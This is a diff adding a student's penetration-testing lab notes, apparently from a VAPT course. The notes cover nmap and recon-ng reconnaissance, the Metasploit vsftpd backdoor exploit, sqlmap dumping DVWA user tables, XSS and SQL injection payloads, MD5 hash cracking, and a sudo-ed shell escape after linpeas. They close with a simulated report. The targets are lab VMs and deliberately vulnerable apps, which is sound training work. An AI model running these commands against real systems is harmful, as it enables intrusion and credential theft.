@@ -1,0 +1,182 @@
+m1 
+
+ifconfig
+nmap -sn 192.168.56.0/24
+nmap -O 192.168.56.100
+nmap -sV 192.168.56.100
+nmap -O 192.168.56.1
+nmap -sV 192.168.56.1
+amass enum -d techsecure.com
+$recon-ng
+$workspaces create TechSecure
+$marketplace install all
+$modules load recon/domains-hosts/hackertarget
+$set SOURCE google.com 
+$run
+nmap -sV -O -oN scan_report.txt 192.168.1.5
+
+m2
+
+sudo apt install gvm -y
+
+sudo gvm-setup
+
+sudo gvm-start
+
+nikto -h http://192.168.1.6
+
+nikto -h http://192.168.1.6 -o vapt_report.txt
+
+
+m3
+
+meta ifconfig (ip)
+
+kali
+
+nmap -sV 192.168.56.103
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.103
+exploit (dobaar)
+whoami
+hostname
+ls /etc
+
+m4
+
+meta  ifconfig(ip)
+
+kali
+
+http://ip/dvwa
+DVWA Security - security low 
+SQL Injection - 1 - submit
+inspect - storage - phpsessid
+sqlmap -u "url" --cookie="PHPSESSID=<session_id>; security=low" --batch
+sqlmap -u "url" --cookie="PHPSESSID=<session_id>; security=low" --batch --dbs
+sqlmap -u "url" --cookie="PHPSESSID=<session_id>; security=low" --batch -D dvwa --tables
+sqlmap -u "url" --cookie="PHPSESSID=<session_id>; security=low" --batch -D dvwa -T users --columns
+sqlmap -u "url" --cookie="PHPSESSID=<session_id>; security=low" --batch -D dvwa -T users --dump
+
+m5
+
+git clone https://github.com/bkimminich/juice-shop.git
+cd juice-shop
+npm install
+npm start
+
+burp - network -intercept - website - search 
+
+<script>alert('XSS')</script>
+
+<iframe src="javascript:alert('XSS')">
+<img src=x onerror=alert("XSS")>
+http://127.0.0.1:3000/
+
+
+m6
+
+Start Kali Linux.
+Start Metasploitable 2.
+Ensure both VMs are connected to the same Host-Only Network.
+
+
+netdiscover
+nmap -A 192.168.56.103
+ftp 192.168.56.103
+Username: anonymous Password: anonymous
+get backup 
+exit 
+cat backup
+nano hash
+john hash
+
+or just 
+Username: anonymous Password: anonymous
+exit
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash
+john --format=Raw-MD5 hash
+john --show --format=Raw-MD5 hash
+
+m8
+ssh sunset@192.168.1.10
+whoami
+id
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+sudo -l
+sudo ed
+!/bin/sh
+whoami
+id
+hostname
+
+m9 
+
+git clone https://github.com/juice-shop/juice-shop.git --depth 1
+cd juice-shop
+npm install
+npm start
+sudo apt update
+sudo apt install zaproxy -y
+zaproxy
+
+
+m10
+
+nano final_vapt_report.md
+sudo apt update
+sudo apt install pandoc -y
+pandoc final_vapt_report.md -o final_vapt_report.docx
+
+# Final VAPT Report
+
+## Executive Summary
+
+This report presents VAPT exercise. Thethree common vulnerabilities:
+
+- SQL Injection
+- Cross-Site Scripting (XSS)
+- Weak Passwords
+
+## Methodology
+
+Tools:
+- Nmap
+- SQLMap
+
+
+## Vulnerability Descriptions
+
+### SQL Injection
+Payload:
+' OR 1=1 --
+
+Severity: High
+
+### Cross-Site Scripting (XSS)
+Payload:
+<script>alert('XSS')</script>
+
+Severity: Medium
+
+### Weak Passwords
+Credential:
+admin:admin
+
+Severity: High
+
+## Remediation Plan
+
+- Sanitize all user inputs.
+- Use strong passwords and MFA.
+- Apply security patches regularly.
+
+## Final Notes
+
+This is a simulated VAPT report created for educational purposes only.
+
+
